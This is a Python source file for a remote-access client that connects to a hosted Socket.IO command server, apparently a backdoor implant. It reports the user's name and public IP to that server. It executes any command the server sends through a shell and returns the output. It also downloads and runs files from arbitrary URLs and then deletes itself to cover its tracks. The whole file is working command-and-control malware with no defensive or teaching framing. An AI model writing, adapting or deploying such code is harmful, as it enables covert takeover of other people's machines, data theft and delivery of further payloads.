import socketio
import public_ip as ip
import json
import getpass
import os
import subprocess
import requests

#SERVER = 'https://3000-p0syd0n-padfootserver-bziowkwf04k.ws-us102.gitpod.io'
SERVER = 'https://padfoot-server.onrender.com'
# Connect to the Socket.IO server
sio = socketio.Client()

def update(url, location, name, run, is_script):
  r = requests.get(url, allow_redirects=True)
  file_path = f'{location}/{name}'
  open(file_path, 'wb').write(r.content)

  if run:
    if is_script:
      subprocess.run(['python', file_path])
    else:
      subprocess.run([file_path])

    # Delete the currently running file (this script)
    try:
      os.remove(__file__)  # Delete the current script file
    except Exception as e:
      return {'output': f"Error deleting file: {e}"}

def execute_command(command):
  command_parts = command.split()
  if command_parts[0] == 'cd':
    if len(command_parts) > 1:
      try:
        os.chdir(command_parts[1])  # Change working directory
        return f"Changed working directory to: {os.getcwd()}"
      except Exception as e:
        return str(e)
  else:
    try:
      output = subprocess.check_output(command, shell=True, text=True)
    except Exception as e:
      return str(e)

    return output


@sio.on('connect')
def on_connect():
  print('Connected to server')
  data = {'client': True, 'username': getpass.getuser(), 'ip': ip.get()} 
  sio.emit('establishment', data)
  

@sio.on('disconnect')
def on_disconnect():
    print('Disconnected from server')

@sio.on('command')
def command(data):
  output = execute_command(data['command'])
  return_data = {'output': output, 'returnAddress': data['returnAddress']}
  sio.emit('commandResponse', return_data)

@sio.on('curse')
def curse(data):
  command_parts = data['curse'].split(' ')
  if command_parts[0] == "update":
    update_output = update(command_parts[1], command_parts[2], command_parts[3], command_parts[4], command_parts[5])
    sio.emit('curseResponse', update_output)

# Start the connection
sio.connect(SERVER)

# Wait for the connection to establish
sio.wait()
